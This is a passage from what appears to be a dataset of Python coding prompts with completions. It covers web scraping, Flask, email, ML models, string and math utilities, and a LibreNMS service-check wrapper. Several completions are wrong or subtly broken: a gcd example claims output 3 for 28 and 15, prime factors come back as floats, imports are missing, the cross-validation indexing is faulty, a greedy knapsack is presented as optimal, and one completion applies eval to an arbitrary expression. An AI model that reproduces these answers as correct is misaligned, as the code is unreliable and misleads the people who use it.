'html.parser') # extract job postings jobs = soup.find_all('div', {'class': 'jobsearch-SerpJobCard'}) for job in jobs: title_div = job.find('div', {'class': 'title'}) title = title_div.a.text.strip() company = job.find('span', {'class': 'company'}).text.strip() link = title_div.a['href'] location = job.find('div', {'class': 'location'}).text.strip() print('Job Title:', title) print('Company:', company) print('Link:', link) print('Location:', location)"},{"prompt":"Generate a correct python program for solving the following problem Given a list of values, find the indices of all pairs whose sum is equal to a given targe","completion":"def find_pairs_with_sum(values, target): indices_list = [] for i in range(len(values)): x = target - values[i] if x in values[i+1:]: indices_list.extend([i, values.index(x)]) return indices_list"},{"prompt":"Design a web API in Python, which returns the average of a list of numbers.","completion":"from flask import Flask, jsonify app = Flask(__name__) @app.route(\\"/average\\", methods=[\\"POST\\"]) def get_average(): list_of_numbers = request.get_json() average = sum(list_of_numbers) / len(list_of_numbers) return jsonify(average)"},{"prompt":"Generate a Python script to automate the task of sending an email. Not applicable","completion":"# Python program to automate sending an email import smtplib from email.message import EmailMessage # Define the from and to address fromaddr = \\"sender@example.com\\" toaddr = \\"receiver@example.com\\" # Create the message msg = EmailMessage() msg['Subject'] = 'Test Email' msg['From'] = fromaddr msg['To'] = toaddr msg.set_content('This is a test email message.') # Send the email server = smtplib.SMTP('smtp.example.com', 587) server.starttls() server.login(fromaddr, \\"password\\") server.send_message(msg) server.quit()"},{"prompt":"Build a neural network model in Python to predict the quality of a wine based on its characteristics. Not applicable","completion":"import pandas as pd import numpy as np from sklearn.model_selection import train_test_split from sklearn.preprocessing import StandardScaler from keras.models import Sequential from keras.layers import Dense # Load the data wine_data = pd.read_csv(\\"wine.csv\\") # Split the data into training and test sets X = wine_data.drop(\\"quality\\", axis=1) y = np.array(wine_data[\\"quality\\"]) X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2) # Scale the data scaler = StandardScaler() X_train = scaler.fit_transform(X_train) X_test = scaler.fit_transform(X_test) # Create the model model = Sequential() model.add(Dense(128, input_shape=(len(X_train[0]),), activation=\\"relu\\")) model.add(Dense(64, activation=\\"relu\\")) model.add(Dense(32, activation=\\"relu\\")) model.add(Dense(16, activation=\\"relu\\")) model.add(Dense(1, activation=\\"sigmoid\\")) # Compile the model model.compile(optimizer=\\"adam\\", loss=\\"mean_squared_error\\", metrics=[\\"accuracy\\"]) # Fit the model model.fit( X_train, y_train, validation_data=(X_test, y_test), epochs=500, batch_size=32 )"},{"prompt":"Create an algorithm in Python that prints a multiplication table. Number: 8","completion":"for x in range(1, 11): for y in range(1, 11): print(str(x) + \\"x\\" + str(y) + \\"=\\" + str(x * y)) print(\\"The multiplication table of 8:\\") for x in range(1, 11): print(str(x) + \\"x\\" + \\"8\\" + \\"=\\" + str(x * 8))"},{"prompt":"Develop a predictive model in Python to determine the species of Iris flower given the characteristics.","completion":"import numpy as np import pandas as pd from sklearn import datasets from sklearn.model_selection import train_test_split from sklearn.model_selection import StratifiedKFold from sklearn.linear_model import LogisticRegression from sklearn.neighbors import KNeighborsClassifier from sklearn.tree import DecisionTreeClassifier from sklearn.svm import SVC from sklearn.ensemble import RandomForestClassifier from sklearn.metrics import accuracy_score # Load dataset iris = datasets.load_iris() # Create feature matrix X = iris.data # Create target vector y = iris.target # Split into training and test sets X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.33, random_state=42) # Define the classifiers list classifiers = [ LogisticRegression(), KNeighborsClassifier(), DecisionTreeClassifier(), SVC(), RandomForestClassifier()] # Create a dictionary for saving results results = {} # Train and test for each classifier for classifier in classifiers: kfold = StratifiedKFold(n_splits=10) scores = [] for train_index, test_index in kfold.split(X, y): model = classifier.fit(X_train[train_index], y_train[train_index]) y_pred = model.predict(X_test[test_index]) scores.append(accuracy_score(y_test[test_index],y_pred)) results[classifier.__class__.__name__] = scores # Print the scores for key, scores in results.items(): print(key, sum(scores)/len(scores))"},{"prompt":"Create a Python program for identifying the longest common string in two text documents. Document 1: This is a test document for identifying the longest common string. Document 2: This is another document for searching for the longest common string.","completion":"def longest_common_substring(s1, s2): m = [[0] * (1 + len(s2)) for i in range(1 + len(s1))] longest, x_longest = 0, 0 for x in range(1, 1 + len(s1)): for y in range(1, 1 + len(s2)): if s1[x - 1] == s2[y - 1]: m[x][y] = m[x - 1][y - 1] + 1 if m[x][y] > longest: longest = m[x][y] x_longest = x else: m[x][y] = 0 return s1[x_longest - longest: x_longest] document1 = \\"This is a test document for identifying the longest common string.\\" document2 = \\"This is another document for searching for the longest common string.\\" print(longest_common_substring(document1, document2)) # Output: \\"longest common string\\""},{"prompt":"Develop a Python code to encode text into base64.","completion":"import base64 # Encode a text into base64 def encode_base64(text): # convert the text to bytes object text_bytes = text.encode('ascii') # encode it into base64 base64_bytes = base64.b64encode(text_bytes) # convert it back to a string base64_encoded_text = base64_bytes.decode('ascii') return base64_encoded_text print(encode_base64('This is a test'))"},{"prompt":"Create a Python algorithm to return all possible combinations of a given list. [1, 2, 3]","completion":"def subset(s): if len(s) == 0: return [[]] else: pre_list = subset(s[1:]) post_list = [] for i in pre_list: post_list.append(i+[s[0]]) return pre_list + post_list result = subset([1, 2, 3]) print(result)"},{"prompt":"mplement a stack in Python using lists. Not applicable","completion":"class Stack: def __init__(self): self.items = [] def isEmpty(self): return self.items == [] def push(self, item): self.items.append(item) def pop(self): return self.items.pop() def peek(self): return self.items[len(self.items)-1] def size(self): return len(self.items) stack = Stack() stack.push(1) stack.push(2) print(stack.peek()) print(stack.pop()) print(stack.size())"},{"prompt":"Construct a Python program to classify a given text using a Multinomial Naive Bayes classifier.","completion":"import json import pandas as pd from sklearn.naive_bayes import MultinomialNB from sklearn.feature_extraction.text import CountVectorizer # load the training data with open(\\"training_data.json\\") as f: training_data = json.load(f) # create a dataframe from the training data df = pd.DataFrame(training_data) # create count vectorizer vec = CountVectorizer() X = vec.fit_transform(df[\\"text\\"]) y = df[\\"class\\"] # train the model clf = MultinomialNB() clf.fit(X, y) # predict the class of the text text = \\"this is a sample text\\" x = vec.transform([text]) # transform the text into counts clf.predict(x)"},{"prompt":"Create a Python program to check if two given strings are anagrams. An anagram is a rearrangement of a series of characters in a word to form different words. A = earth B = heart","completion":"def is_anagram(string1, string2): ''' A function to check if two strings are anagrams ''' # convert strings to lower case string1 = string1.lower() string2 = string2.lower() # sort string and compare sorted1 = sorted(string1) sorted2 = sorted(string2) if sorted1 == sorted2: return True else: return False A = \\"earth\\" B = \\"heart\\" print(is_anagram(A, B)) # True"},{"prompt":"Create a Python program to generate a random name from two given lists of names. first_names = [Alice, John, Joe, Michael] last_names = [Smith, Williams, Jackson, Brown]","completion":"import random def get_random_name(first_names, last_names): first_name = random.choice(first_names) last_name = random.choice(last_names) random_name = first_name + ' ' + last_name return random_name"},{"prompt":"Create a function in Python to print the Fibonacci numbers from 0 to 1000.","completion":"def printFibonacci(): fib1 = 0 fib2 = 1 print(fib1, end = \\" \\") while (fib2 < 1000): print(fib2, end = \\" \\") temp = fib2 fib2 = fib2 + fib1 fib1 = temp"},{"prompt":"Write a function in Python to evaluate an algebraic expression exp= ((x+y)^2)*(x+1) x=2 y=3","completion":"def evaluate_expr(expr,x,y): x = float(x) y = float(y) def eval_expr(expr): return eval(expr) evaluation = eval_expr(expr.replace(\\"x\\", str(x)).replace(\\"y\\", str(y))) return evaluation exp = \\"((x+y)^2)*(x+1)\\" x = 2 y = 3 print(evaluate_expr(exp,x,y))"},{"prompt":"Write a Python program to find the difference of two sets. set_1 = {1,2,3,4,5} set_2 = {2,4,6,8,10}","completion":"difference = set_1.difference(set_2)"},{"prompt":"Design a Python algorithm for checking whether a given string contains only unique characters.","completion":"def string_unique(string): if len(string) > 256: return False else: my_set = set() for character in string: if character in my_set: return False else: my_set.add(character) return True"},{"prompt":"Generate a Python program to convert a roman numeral to an integer. numeral = 'IX'","completion":"def roman_to_int(romanStr): convMap = {'I':1, 'V':5, 'X':10, 'L':50, 'C':100, 'D':500, 'M':1000} num = 0 for i in range(0, len(romanStr)): if i+1 < len(romanStr) and convMap[romanStr[i]] < convMap[romanStr[i+1]]: num -= convMap[romanStr[i]] else: num += convMap[romanStr[i]] return num numeral = 'IX' print(\\"Integer value of the Roman numeral {} is {}\\".format(numeral, roman_to_int(numeral)))"},{"prompt":"This code is a Python script for running a Psychomotor Vigilance Task. To use it, run the script in a Python environment. The script will display instructions and a button for the user to click. The user should click the button when it appears. The script will record the user's response time and display it at the end, along with the mean response time for all trials.","completion":"#!/usr/bin/env python3 '''Psychomotor Vigilance Task''' # # STAP constants and stdio import json,sys if 'raw_input' in vars(__builtins__): input = raw_input #Fix for Python 2.x raw_input def send(d): print(json.dumps(d)); sys.stdout.flush() def recv(): return json.loads(input()) CLEAR = None def obj(id=None,content=NotImplemented,**options): if id is not None: options['id']=id if content is not NotImplemented: options['v']=content return options # import random,statistics TRIALS = 10 INSTRUCTIONS = 'Click a button when one appears here' BUTTON = obj('Click Me',False,onin={'v':CLEAR}) def main(): log=[] ums=0 #announce required options send({'require':{'options':['U','onin']},'template':'[type=\\"bin\\"][level=\\"1\\"]{height:200px}'}) #display Trial and instructions containers; let user software know that any buttons inside the instructions container should be deleted once user-input (i.e. click) is detected send([ obj('Trial',1,max=TRIALS), obj(INSTRUCTIONS,[]) ]) #do trials for trial in range(1,TRIALS+1): #set random time for button appearance buttonAppearanceTime=ums+random.randrange(2000,10000) #update trial time, wait till buttonAppearanceTime, then add the 'Click me' button send([ obj('Trial',trial), obj(INSTRUCTIONS, [BUTTON], U=buttonAppearanceTime) ]) #get participant action ums=recv()[0] log.append(ums-buttonAppearanceTime) send([ obj('Your response time is',log[-1],unit='ms') ]) #display goodbye message in popup send([ CLEAR, obj('Your mean response time is',statistics.mean(log)), 'Thank you for your participation.' ]) if __name__=='__main__': main()"},{"prompt":"Analyze a given Python list containing only numbers and classify it as either containing only even numbers, only odd numbers or both. [2, 4, 5, 7]","completion":"def classifyList(list): even = True odd = True for num in list: if (num % 2 == 0): odd = False else: even = False if (even): print(\\"list contains only even numbers\\") if (odd): print(\\"list contains only odd numbers\\") if (odd == False and even == False): print(\\"list contains both even and odd numbers\\") list = [2,4,5,7] classifyList(list)"},{"prompt":"Create a commandline application in Python for making a list of grocery items. Not applicable","completion":"import json #function for adding items def add_item(name, price): grocery_list.append({\\"name\\": name, \\"price\\": price}) #function to retrieve the list of items def get_list(): return json.dumps(grocery_list) #empty list to store the items grocery_list = [] # prompts for taking input name and price name = input(\\"Enter the item name\\") price = int(input(\\"Enter the item price\\")) # store items in the list by calling the add_item function add_item(name, price) # print the list print(get_list())"},{"prompt":"Create a Python program that displays a table of results based on user input. Inputs for the table are scale (integer) and input values (list of integers)","completion":"scale = int(input('Input scale: ')) values = list(map(int, input('Input values: ').split())) def print_table(scale, values): for v in values: print(f'{v:>{scale}}', end='t') print() for v in values: print(f'{v**2:>{scale}}', end='t') print() for v in values: print(f'{v**3:>{scale}}', end='t') print() print_table(scale, values)"},{"prompt":"Create a Python script to sort the given integers in descending order. [3, 7, 2, 8, 10]","completion":"input_list = [3, 7, 2, 8, 10] input_list.sort(reverse=True) print(input_list)"},{"prompt":"Write a Python program to automatically generate the HTML for a table from a dictionary of data. d = {col1: [A, B, C], col2: [2, 4, 6], col3: [3, 5, 7]}","completion":"html_str = '<table><tr>' for key in d: html_str += '<th>{}</th>'.format(key) html_str += '</tr>' for i in range(len(d['col1'])): html_str += '<tr>' for key in d: html_str += '<td>{}</td>'.format(d[key][i]) html_str += '</tr>' html_str += '</table>' print(html_str)"},{"prompt":"Design a Python class for quadratic equations.","completion":"class QuadraticEquation: def __init__(self, a, b, c): self.a = a self.b = b self.c = c def get_roots(self): d = (self.b**2) - (4*self.a*self.c) # find two solutions sol1 = (-self.b-cmath.sqrt(d))/(2*self.a) sol2 = (-self.b+cmath.sqrt(d))/(2*self.a) return (sol1, sol2)"},{"prompt":"Create a python script to reverse a given InputString. InputString = My string","completion":"def reverseString(InputString): return InputString[::-1]"},{"prompt":"Create a program in Python to edit a given text by removing unwanted characters. text = Hello, World!","completion":"def remove_unwanted_chars(text): return ''.join(c for c in text if c.isalnum() or c in [' ', ',']) text = \\"Hello, World!\\" print(\\"Text after removing unwanted characters:\\", remove_unwanted_chars(text))"},{"prompt":"Write a Python program to sort a given array of numbers.","completion":"def sort_numbers(arr): for i in range(len(arr)): min_idx = i for j in range(i+1, len(arr)): if arr[min_idx] > arr[j]: min_idx = j arr[i], arr[min_idx] = arr[min_idx], arr[i] arr = [2, 5, 1, 3, 8, 4] sort_numbers(arr)"},{"prompt":"Using the given lists, create a Python dictionary that contains the expected output. key_list = ['a', 'b', 'c'] value_list = [1, 2, 3]","completion":"dictionary = dict(zip(key_list, value_list)) print(dictionary)"},{"prompt":"Create a function in Python that returns the unique elements in a given array. [1, 4, 2, 1, 5, 4]","completion":"def unique(arr): unique_arr = [] for i in arr: if i not in unique_arr: unique_arr.append(i) return unique_arr"},{"prompt":"Optimize a code snippet in Python for maximum performance. import time def sleep_for_the_ night(): time.sleep(5) while True: sleep_for_the_ night()","completion":"import time def sleep_for_the_night(): while True: start_time = time.time() time.sleep(5) end_time = time.time() elapsed_time = end_time - start_time if elapsed_time < 5: time.sleep(5-elapsed_time) while True: sleep_for_the_night()"},{"prompt":"Create a Python class called 'Book' that stores an ISBN, title, author and publisher for a book.","completion":"class Book: def __init__(self, isbn, title, author, publisher): self.isbn = isbn self.title = title self.author = author self.publisher = publisher def get_isbn(self): return self.isbn def get_title(self): return self.title def get_author(self): return self.author def get_publisher(self): return self.publisher"},{"prompt":"What is the difference between a function and a method in Python?","completion":"The difference between a function and a method in Python is that a function is a section of code that performs a specific task and can be called from anywhere in the program, while a method is a function that is associated with a class and can only be called from within the class. A method can access or modify the class state - the attributes of the class that store data - while a function typically cannot."},{"prompt":"Create an objectoriented Python program to model a Vehicle.","completion":"class Vehicle: def __init__(self, capacity, speed): self.capacity = capacity self.speed = speed def increase_speed(self): self.speed += 10 def decrease_speed(self): if self.speed > 0: self.speed -= 10"},{"prompt":"Write a Python script to print the frequency of all unique words in a given string. Hello world, hello programmer","completion":"words = \\"Hello world, hello programmer\\".split() word_freq = {} for word in words: if word not in word_freq: word_freq[word] = 1 else: word_freq[word] += 1 for key, value in word_freq.items(): print(f\\"{key} : {value}\\")"},{"prompt":"Create an optimization algorithm written in Python that chooses the items to include in a given list to maximize the total value while staying within a weight constraint. list = [{'name': 'item1', 'weight': 5, 'value': 10}, {'name': 'item2', 'weight': 6, 'value': 15}, {'name': 'item3', 'weight': 3, 'value': 5}] weight_limit = 9","completion":"def knapsack(items, weight_limit): # Initialize an empty list to hold the items to include in the knapsack knapsack_items = [] # Iterate over each item in the list for item in items: # Calculate the weight of the items already in the knapsack knapsack_weight = sum([i['weight'] for i in knapsack_items]) # If the item can fit in the knapsack, add it if item['weight'] + knapsack_weight <= weight_limit: knapsack_items.append(item) # Return the items to include in the knapsack return knapsack_items list = [{'name': 'item1', 'weight': 5, 'value': 10}, {'name': 'item2', 'weight': 6, 'value': 15}, {'name': 'item3', 'weight': 3, 'value': 5}] weight_limit = 9 # Call the knapsack function optimal_items = knapsack(list, weight_limit) # Print the items to include in the knapsack print(optimal_items) # [{'name': 'item1', 'weight': 5, 'value': 10}, {'name': 'item3', 'weight': 3, 'value': 5}]"},{"prompt":"Create a custom function in python to generate a random number between 1 to 10.","completion":"import random def random_num(): return random.randint(1, 10)"},{"prompt":"Create a python program to cluster a given dataset using KMeans clustering.","completion":"\\"\\"\\" Cluster a given dataset using K-Means clustering \\"\\"\\" import numpy as np from sklearn.cluster import KMeans def cluster_dataset(X, n_clusters): kmeans = KMeans(n_clusters=n_clusters, random_state=0).fit(X) return kmeans.labels_ if __name__ == '__main__': X = np.array([[1, 2], [1, 4], [1, 0], [10, 2], [10, 4], [10, 0]]) print(cluster_dataset(X, n_clusters=2))"},{"prompt":"Write a script in Python to get the largest and smallest number from a given list. [9, 10, 12, 0, 5]","completion":"# Solution # First, let's define our list of numbers my_list = [9, 10, -12, 0, 5] # Now, let's get the largest and the smallest numbers max_val = max(my_list) min_val = min(my_list) # Finally, we can print out the results print(\\"Largest number:\\", max_val) print(\\"Smallest number:\\", min_val)"},{"prompt":"Write a script in Python to sort a given list of numbers according to their occurrence in the list. unsorted_list = [1, 4, 2, 4, 8, 1, 2, 8, 2]","completion":"def sort_by_occurrence(unsorted_list): d = {} for num in unsorted_list: d[num] = d.get( num, 0 ) + 1 sorted_list = sorted(d, key=d.get, reverse=True) return sorted_list"},{"prompt":"Create a python program to find the prime factors of an input number. num = 50","completion":"def prime_factors(num): factors = [] i = 2 while num > 1: while num % i == 0: num = num / i factors.append(i) i += 1 return factors num = 50 factors = prime_factors(num) print(factors) # -> [2, 5, 5]"},{"prompt":"Define a Python class called “Car”, with attributes for make, model, and color. Not applicable","completion":"class Car: def __init__(self, make, model, color): self.make = make self.model = model self.color = color def get_description(self): return f\\"The {self.make} {self.model} is {self.color}.\\""},{"prompt":"Create a class in Python with a constructor that initializes 3 variables and a method that prints the values of these variables.","completion":"class Example: def __init__(self, a, b, c): self.a = a self.b = b self.c = c def print_values(self): print(self.a, self.b, self.c) example = Example(10, 20, 30) example.print_values()"},{"prompt":"Develop a Python function to determine the greatest common divisor of two integers. a = 28 b = 15","completion":"def gcd(a, b): if(b == 0): return a return gcd(b, a%b) def main(): a = 28 b = 15 print(gcd(a,b)) if __name__ == \\"__main__\\": main() # Output 3"},{"prompt":"To use the serviceswrapper tool, follow these steps: 1. Install the required python module pythonmysqldb on Ubuntu Linux using the command aptget install pythonmysqldb. On FreeBSD, use the command cd /usr/ports/*/pyMySQLdb && make install clean. On RHEL 7, use the command yum install MySQLpython. On RHEL 8, use the command dnf install mariadbconnectorcdevel gcc && python m pip install mysqlclient. 2. Run the tool with the command python3 serviceswrapper.py <workers>. Replace <workers> with the number of threads that should run simultaneously. If no argument is given, it will assume a default of 1 thread. 3. Wait for the tool to finish checking the services. The tool will print information to the screen about the progress of the service check. 4. If the process takes more than 5 minutes to finish, you may need faster hardware or more threads. The tool will recommend a minimum number of threads to use based on the elapsed time of the service check.","completion":"#! /usr/bin/env python3 \\"\\"\\" services-wrapper A small tool which wraps around check-services.php and tries to guide the services process with a more modern approach with a Queue and workers. Based on the original version of poller-wrapper.py by Job Snijders Author: Neil Lathwood <neil@librenms.org> Orsiris de Jong <contact@netpower.fr> Date: Oct 2019 Usage: This program accepts one command line argument: the number of threads that should run simultaneously. If no argument is given it will assume a default of 1 thread. Ubuntu Linux: apt-get install python-mysqldb FreeBSD: cd /usr/ports/*/py-MySQLdb && make install clean RHEL 7: yum install MySQL-python RHEL 8: dnf install mariadb-connector-c-devel gcc && python -m pip install mysqlclient Tested on: Python 3.6.8 / PHP 7.2.11 / CentOS 8 License: This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version. This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details. You should have received a copy of the GNU General Public License along with this program. If not, see http://www.gnu.org/licenses/. LICENSE.txt contains a copy of the full GPLv3 licensing conditions. \\"\\"\\" import LibreNMS.library as LNMS try: import json import os import queue import subprocess import sys import threading import time from optparse import OptionParser except ImportError as exc: print('ERROR: missing one or more of the following python modules:') print('threading, queue, sys, subprocess, time, os, json') print('ERROR: %s' % exc) sys.exit(2) APP_NAME = \\"services_wrapper\\" LOG_FILE = \\"logs/\\" + APP_NAME + \\".log\\" _DEBUG = False servicedisco = False real_duration = 0 service_devices = 0 \\"\\"\\" Threading helper functions \\"\\"\\" # (c) 2015, GPLv3, Daniel Preussker <f0o@devilcode.org> <<<EOC0 def memc_alive(): try: global memc key = str(uuid.uuid4()) memc.set('poller.ping.' + key, key, 60) if memc.get('poller.ping.' + key) == key: memc.delete('poller.ping.' + key) return True else: return False except: return False def memc_touch(key, time): try: global memc val = memc.get(key) memc.set(key, val, time) except: pass def get_time_tag(step): ts = int(time.time()) return ts - ts % step #EOC0 \\"\\"\\" A seperate queue and a single worker for printing information to the screen prevents the good old joke: Some people, when confronted with a problem, think, \\"I know, I'll use threads,\\" and then they two they hav erpoblesms. \\"\\"\\" def printworker(): nodeso = 0 while True: # (c) 2015, GPLv3, Daniel Preussker <f0o@devilcode.org> <<<EOC4 global IsNode global servicedisco if servicedisco: if not IsNode: memc_touch('service.master', 10) nodes = memc.get('service.nodes') if nodes is None and not memc_alive(): print(\\"WARNING: Lost Memcached. Taking over all devices. Nodes will quit shortly.\\") servicedisco = False nodes = nodeso if nodes is not nodeso: print(\\"INFO: %s Node(s) Total\\" % (nodes)) nodeso = nodes else: memc_touch('service.nodes', 10) try: worker_id, device_id, elapsed_time = print_queue.get(False) except: pass try: time.sleep(1) except: pass continue else: worker_id, device_id, elapsed_time = print_queue.get() # EOC4 global real_duration global per_device_duration global service_devices real_duration += elapsed_time per_device_duration[device_id] = elapsed_time service_devices += 1 if elapsed_time < 300: print(\\"INFO: worker %s finished device %s in %s seconds\\" % (worker_id, device_id, elapsed_time)) else: print(\\"WARNING: worker %s finished device %s in %s seconds\\" % (worker_id, device_id, elapsed_time)) print_queue.task_done() \\"\\"\\" This class will fork off single instances of the check-services.php process, record how long it takes, and push the resulting reports to the printer queue \\"\\"\\" def poll_worker(): while True: device_id = poll_queue.get() # (c) 2015, GPLv3, Daniel Preussker <f0o@devilcode.org> <<<EOC5 if not servicedisco or memc.get('service.device.' + str(device_id)) is None: if servicedisco: result = memc.add('service.device.' + str(device_id), config['distributed_poller_name'], 300) if not result: print(\\"This device (%s) appears to be being service checked by another service node\\" % (device_id)) poll_queue.task_done() continue if not memc_alive() and IsNode: print(\\"Lost Memcached, Not service checking Device %s as Node. Master will check it.\\" % device_id) poll_queue.task_done() continue # EOC5 try: start_time = time.time() output = \\"-d >> %s/services_device_%s.log\\" % (log_dir, device_id) if debug else \\">> /dev/null\\" # TODO replace with command_runner command = \\"/usr/bin/env php %s -h %s %s 2>&1\\" % (service_path, device_id, output) subprocess.check_call(command, shell=True) elapsed_time = int(time.time() - start_time) print_queue.put([threading.current_thread().name, device_id, elapsed_time]) except (KeyboardInterrupt, SystemExit): raise except: pass poll_queue.task_done() if __name__ == '__main__': logger = LNMS.logger_get_logger(LOG_FILE, debug=_DEBUG) install_dir = os.path.dirname(os.path.realpath(__file__)) LNMS.check_for_file(install_dir + '/config.php') config = json.loads(LNMS.get_config_data(install_dir)) service_path = config['install_dir'] + '/check-services.php' log_dir = config['log_dir'] # (c) 2015, GPLv3, Daniel Preussker <f0o@devilcode.org> <<<EOC1 if 'distributed_poller_group' in config: service_group = str(config['distributed_poller_group']) else: service_group = False if ('distributed_poller' in config and 'distributed_poller_memcached_host' in config and 'distributed_poller_memcached_port' in config and config['distributed_poller']): try: import memcache import uuid memc = memcache.Client([config['distributed_poller_memcached_host'] + ':' + str(config['distributed_poller_memcached_port'])]) if str(memc.get(\\"service.master\\")) == config['distributed_poller_name']: print(\\"This system is already joined as the service master.\\") sys.exit(2) if memc_alive(): if memc.get(\\"service.master\\") is None: print(\\"Registered as Master\\") memc.set(\\"service.master\\", config['distributed_poller_name'], 10) memc.set(\\"service.nodes\\", 0, 300) IsNode = False else: print(\\"Registered as Node joining Master %s\\" % memc.get(\\"service.master\\")) IsNode = True memc.incr(\\"service.nodes\\") servicedisco = True else: print(\\"Could not connect to memcached, disabling distributed service checks.\\") servicedisco = False IsNode = False except SystemExit: raise except ImportError: print(\\"ERROR: missing memcache python module:\\") print(\\"On deb systems: apt-get install python3-memcache\\") print(\\"On other systems: pip3 install python-memcached\\") print(\\"Disabling distributed discovery.\\") servicedisco = False else: servicedisco = False # EOC1 s_time = time.time() real_duration = 0 per_device_duration = {} service_devices = 0 \\"\\"\\" Take the amount of threads we want to run in parallel from the commandline if None are given or the argument was garbage, fall back to default of 16 \\"\\"\\" usage = \\"usage: %prog [options] <workers> (Default: 1 (Do not set too high)\\" description = \\"Spawn multiple check-services.php processes in parallel.\\" parser = OptionParser(usage=usage, description=description) parser.add_option('-d', '--debug', action='store_true', default=False, help=\\"Enable debug output. WARNING: Leaving this enabled will consume a lot of disk space.\\") (options, args) = parser.parse_args() debug = options.debug try: amount_of_workers = int(args[0]) except (IndexError, ValueError): amount_of_workers = 1 devices_list = [] # (c) 2015, GPLv3, Daniel Preussker <f0o@devilcode.org> <<<EOC2 if service_group is not False: query = \\"SELECT DISTINCT(\`services\`.\`device_id\`) FROM \`services\` LEFT JOIN \`devices\` ON \`services\`.\`device_id\` = \`devices\`.\`device_id\` WHERE \`devices\`.\`poller_group\` IN(\\" + service_group + \\") AND \`devices\`.\`disabled\` = 0\\" else: query = \\"SELECT DISTINCT(\`services\`.\`device_id\`) FROM \`services\` LEFT JOIN \`devices\` ON \`services\`.\`device_id\` = \`devices\`.\`device_id\` WHERE \`devices\`.\`disabled\` = 0\\" # EOC2 db = LNMS.db_open(config['db_socket'], config['db_host'], config['db_port'], config['db_user'], config['db_pass'], config['db_name']) cursor = db.cursor() cursor.execute(query) devices = cursor.fetchall() for row in devices: devices_list.append(int(row[0])) # (c) 2015, GPLv3, Daniel Preussker <f0o@devilcode.org> <<<EOC3 if servicedisco and not IsNode: query = \\"SELECT MAX(\`device_id\`), MIN(\`device_id\`) FROM \`services\`\\" cursor.execute(query) devices = cursor.fetchall() maxlocks = devices[0][0] or 0 minlocks = devices[0][1] or 0 # EOC3 db.close() poll_queue = queue.Queue() print_queue = queue.Queue() print(\\"INFO: starting the service check at %s with %s threads\\" % (time.strftime(\\"%Y-%m-%d %H:%M:%S\\"), amount_of_workers)) for device_id in devices_list: poll_queue.put(device_id) for i in range(amount_of_workers): t = threading.Thread(target=poll_worker) t.setDaemon(True) t.start() p = threading.Thread(target=printworker) p.setDaemon(True) p.start() try: poll_queue.join() print_queue.join() except (KeyboardInterrupt, SystemExit): raise total_time = int(time.time() - s_time) print(\\"INFO: services-wrapper checked %s devices in %s seconds with %s workers\\" % (service_devices, total_time, amount_of_workers)) # (c) 2015, GPLv3, Daniel Preussker <f0o@devilcode.org> <<<EOC6 if servicedisco or memc_alive(): master = memc.get(\\"service.master\\") if master == config['distributed_poller_name'] and not IsNode: print(\\"Wait for all service-nodes to finish\\") nodes = memc.get(\\"service.nodes\\") while nodes is not None and nodes > 0: try: time.sleep(1) nodes = memc.get(\\"service.nodes\\") except: pass print(\\"Clearing Locks\\") x = minlocks while x <= maxlocks: memc.delete('service.device.' + str(x)) x = x + 1 print(\\"%s Locks Cleared\\" % x) print(\\"Clearing Nodes\\") memc.delete(\\"service.master\\") memc.delete(\\"service.nodes\\") else: memc.decr(\\"service.nodes\\") print(\\"Finished %s.\\" % time.time()) # EOC6 show_stopper = False if total_time > 300: print(\\"WARNING: the process took more than 5 minutes to finish, you need faster hardware or more threads\\") print(\\"INFO: in sequential style service checks the elapsed time would have been: %s seconds\\" % real_duration) for device in per_device_duration: if per_device_duration[device] > 300: print(\\"WARNING: device %s is taking too long: %s seconds\\" % (device, per_device_duration[device])) show_stopper = True if show_stopper: print(\\"ERROR: Some devices are taking more than 300 seconds, the script cannot recommend you what to do.\\") else: recommend = int(total_time / 300.0 * amount_of_workers + 1) print( \\"WARNING: Consider setting a minimum of %d threads. (This does not constitute professional advice!)\\" % recommend) sys.exit(2)"},{"prompt":"Create a Python function that takes a string and finds the longest word in it. sentence = This is an example of a sentence with some words","completion":"def longestWord(sentence): longestWord = '' maxLength = 0 for word in sentence.split(' '): if len(word) > maxLength: maxLength = len(word) longestWord = word return longestWord longest_word = longestWord(sentence) print('The longest word is: '+ longest_word)"},{"prompt":"Write a Python program to solve linear equations of two variables.","completion":"def solve_linear_equations(a,b,c,d,e,f): x = (e*d - b*f) / (a*d - b*c) y = (a*f - e*c) / (a*d - b*c) return (x,y) a,b,c,d,e,f = 1,2,3,4,5,6 solution = solve_linear_equations(a,b,c,d,e,f) print(solution)"},{"prompt":"Build a command line application in Python to flatten an array of elements. arr = [1, [], [2, [[3], [4, 2]], 5, [[[[[[[[[[]]]]]]]]]]]","completion":"def flatten(arr): result = [] for item in arr: if isinstance(item, list): result.extend(flatten(item)) else: result.append(item) return result flattenedArr = flatten(arr) print(flattenedArr)"},{"prompt":"Add code in python to the given argument to iterate over a list of numbers and print the even numbers. [1,2,3,4,5]","completion":"# Iterate over numbers for num in [1,2,3,4,5]: # Check for even if(num % 2 == 0): # Print the even numbers print(num)"},{"prompt":"Write a Python program to create a list that represents the frequency of each word in a given sentence. This is a sentence","completion":"sentence = \\"This is a sentence\\" sentence_list = sentence.split() frequency_list = [] for word in sentence_list: frequency_list.append(sentence_list.count(word)) frequency_dict = dict(zip(sentence_list, frequency_list)) print(frequency_dict)"},{"prompt":"Optimize the given Python program by reducing the time complexity. def find_max(lst): max_value = 0 for item in lst: if max_value < item: max_value = item return max_value lst = [3,7,2,9,4,6,1]","completion":"def find_max(arr): n = len(arr) max_value = arr[0] # Iterate from 1 to the length of the array for i in range(1, n): if arr[i] > max_value: max_value = arr[i] return max_value lst = [3,7,2,9,4,6,1] result = find_max(lst) print(result) #Returns 9"},{"prompt":"Create a code to find the longest common substring in two strings string1 = OldSite:Geeksforgeeks.org string2 = Newsite:Geeks.com","completion":"# Python program to find the longest common # sub-string in two strings def LongestCommonString(str1, str2): m = len(str1) n = len(str2) #placeholder array L = [[None]*(n+1) for i in range(m+1)] result = 0 # To store length of the longest common sub-string # Following steps build LCSuff[m+1][n+1] in bottom up fashion for i in range(m+1): for j in range(n+1): if i == 0 or j == 0: L[i][j] = 0 elif str1[i-1] == str2[j-1]: L[i][j] = L[i-1][j-1] + 1 result = max(result, L[i][j]) else: L[i][j] 